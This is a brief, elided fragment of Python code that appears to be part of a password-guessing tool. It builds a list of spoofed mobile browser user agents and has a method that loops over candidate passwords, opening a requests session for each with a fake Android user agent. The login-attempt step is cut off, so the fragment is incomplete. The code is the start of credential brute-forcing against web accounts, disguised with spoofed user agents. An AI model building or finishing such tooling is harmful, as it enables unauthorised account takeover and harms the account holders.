...
def user_agentAPI():
	ugent =[
	    ...
	    "Mozilla/5.0 (Linux; Android 7.1.2; HTC Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",]
	...
	def mobil(self, user, manual,**data):
		...
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = ("Mozilla/5.0 (Linux; Android 7.0; HTC One M9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36")
